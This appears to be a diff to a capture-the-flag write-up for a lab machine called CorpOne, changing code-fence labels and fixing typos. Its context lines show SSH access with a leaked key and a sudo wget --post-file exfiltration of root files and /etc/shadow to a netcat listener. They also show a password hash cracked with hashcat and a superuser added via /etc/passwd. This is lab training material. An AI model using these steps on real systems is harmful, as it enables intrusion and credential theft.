@@ -11,7 +11,7 @@ categories:
 
 ## Enumeration
 
-```nmap
+```bash
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -30,7 +30,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-```ffuf
+```bash
 .hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
@@ -84,7 +84,7 @@ It was in `/index.html`...yes that default index page for apache servers
 
 Now we ssh as `jessie`...Don't forget to fix permissions on the key
 
-```
+```bash
 └──╼ $chmod 600 id_rsa
 
 └──╼ $ssh jessie@10.10.92.232 -i id_rsa
@@ -101,13 +101,13 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
 jessie@CorpOne:~$
 ```
 
-```
+```bash
 jessie@CorpOne:~/Documents$ cat user_flag.txt
 jessie_flag_suddenly_appears
 ```
 ## Privilege Escalation
 
-```
+```bash
 jessie@CorpOne:~/Documents$ sudo -l
 Matching Defaults entries for jessie on CorpOne:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -128,14 +128,14 @@ You can use `find` to confirm that
 
 set a netcat listener on your side
 
-```
+```bash
 jessie@CorpOne:~$ sudo wget --post-file=/root/root_flag.txt 10.8.226.203:2311
 --2021-11-27 15:27:02--  http://10.8.226.203:2311/
 Connecting to 10.8.226.203:2311... connected.
 HTTP request sent, awaiting response...
 ```
 
-```
+```bash
 └──╼ $nc -lnvp 2311
 listening on [any] 2311 ...
 connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 58212
@@ -152,13 +152,12 @@ root_flag_goes_here
 ```
 
 And we got root flag! at this point we could just call it a day...
-
 But there is always another possibility
-
-if we can use `wget` to read files we might as well read interresting ones
+if we can use `wget` to read files we might as well read interesting ones
 
 `/etc/shadow`
-```
+
+```bash
 ...
 kernoops:*:17954:0:99999:7:::
 pulse:*:17954:0:99999:7:::
@@ -172,46 +171,15 @@ ha! jessie's hash! those are crackable!
 
 looks like sha-512crypt
 
-```
+```bash
 └──╼ $hashcat -m 1800 '$6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663bXfIV7y.ywZxeOinj4Mckj8/uvA7U.' /usr/share/wordlists/rockyou.txt
 hashcat (v6.1.1) starting...
-
 ```
 well its gonna take too long and I don't have that patience now
 
 But feel free to explore. What I liked the most about this room was the multiple
 ways to escalate
 
-By example there is also a possibilty to add a new superuser to `/etc/passswd`
-
+By example there is also a possibility to add a new superuser to `/etc/passswd`
 You download, modify and upload the file...
-
 If you are curious enough you will find another way
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
